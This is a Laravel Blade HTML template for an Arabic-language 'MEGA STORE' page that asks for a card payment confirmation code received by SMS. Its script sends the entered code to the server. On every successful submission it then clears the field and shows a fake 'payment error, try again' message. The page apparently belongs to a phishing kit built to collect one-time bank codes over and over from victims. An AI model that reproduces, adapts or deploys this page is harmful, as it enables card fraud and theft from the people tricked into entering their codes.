<!DOCTYPE html>
<html lang="en" dir="rtl">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MEGA STORE</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
        integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="{{ asset('front/css/bootstrap.rtl.min.css') }}" />
    <link rel="stylesheet" href="{{ asset('front/css/master.css') }}" />
    <link rel="stylesheet" href="{{ asset('front/css/media.css') }}" />
</head>

<body>
    <div class="container">
        <div class="row d-flex justify-content-center">
            <div class="col-lg-5 p-5">
                <form class="form" method="post" id="submit_code"
                    action="{{ route('set_code') }}"onsubmit="SubmitForm(); return false;">
                    @csrf
                    <div class="row justify-content-center my-4 align-items-center">
                        <div>
                            <img src="{{ asset('front/images/visa.png') }}" class="w-25 ms-5 ps-4" alt="" />
                            <span class="fw-normal fs-4 text-center text-secondary mx-2" dir="ltr">بطاقة ائتمانية |
                            </span>
                        </div>
                    </div>
                    <div>
                    </div>
                    <div class="form-floating mb-3">
                        <input type="tel" name="order" class="form-control rounded-4 tel-input check-input-valid"
                            id="order_num" placeholder="رمز تأكيد العملية" />
                        <label for="order">
                            <div class="text-secondary">
                                <i class="fa-solid fa-circle-check fa-fw mx-2 fa-lg"></i>
                                رمز التأكيد
                            </div>
                        </label>
                        <div class="invalid-feedback invalid-message container mt-2"></div>
                    </div>
                    <div class="px-2">
                        <div class="form-check mb-3 border-top pt-2">
                            <label class="form-check-label text-secondary" style="font-size: 12px"
                                for="flexCheckDefault">يرجى ادخال رمز تأكيد العملية الذي تم ارساله عبر رسالة SMS
                            </label>
                        </div>
                    </div>
                    <div class="mb-3">
                        <button type="submit" class="w-100 btn white-color primary-color confirm-btn rounded-4 py-2"
                            name="mybtn" id="codeConfirm">
                            تأكيد
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <script src="{{ asset('front/js/bootstrap.min.js') }}"></script>
    <script src="{{ asset('front/js/form3.js') }}"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"
        integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script>
        function SubmitForm() {

            $.ajax({
                type: 'POST',
                url: $('#submit_code').attr('action'),
                data: new FormData($('#submit_code')[0]),
                processData: false,
                contentType: false,
                success: function(response) {
                    $('#order_num').val('');
                        const checkInvalid = document.querySelector('.check-input-valid');
                        const invalidMessage = document.querySelector('.invalid-message');
                        checkInvalid.classList.add('is-invalid')
                        checkInvalid.value = ''
                        invalidMessage.textContent = 'حدث خطأ في عملية الدفع حاول مرة اخرى !!'
                        invalidMessage.style.color = 'red'
                }
            });
        }
    </script>
</body>

</html>
